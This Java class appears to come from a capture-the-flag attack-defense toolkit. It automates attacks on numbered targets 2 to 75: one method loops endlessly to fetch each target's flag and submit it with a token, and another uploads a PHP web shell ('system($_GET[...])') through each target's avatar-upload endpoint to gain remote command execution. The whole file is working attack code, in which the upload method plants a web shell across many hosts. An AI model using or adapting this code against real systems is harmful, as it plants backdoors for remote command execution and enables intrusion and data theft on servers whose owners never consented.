package cn.xiaoyes.ctf;

import com.alibaba.fastjson.JSONObject;
import com.dtflys.forest.config.ForestConfiguration;


@SuppressWarnings("all")
public class AppProvider {

    private ForestConfiguration configuration;

    private ApiService service;

    public AppProvider() {
        configuration = ForestConfiguration.configuration();
        service = configuration.createInstance(ApiService.class);
    }

    public void saveFlag(String token) {
        try {
            while (true) {
                for (int i = 2; i <= 75; i++) {
                    String flag = service.getFlag(i + "", (e, forestRequest, forestResponse) -> {
                    });
                    String result = service.saveFlag(flag, token);
                    JSONObject resultJson = JSONObject.parseObject(result);
                    System.out.println(i + " => " + flag + " 状态码=> " + resultJson.get("code") + " 响应信息=> " + resultJson.get("msg"));
                    Thread.sleep(200);
                }
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }


    public void uploadHorse(String fileName,String param) {
        try {
            for (int i = 2; i <= 75; i++) {
                String s = "<?php system($_GET['" + param + "']) ?>";
                String result = service.uploadAvatar(i + "", s, fileName, forestProgress -> {
                });
                System.out.println(i + " => " + result);
                Thread.sleep(500);
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
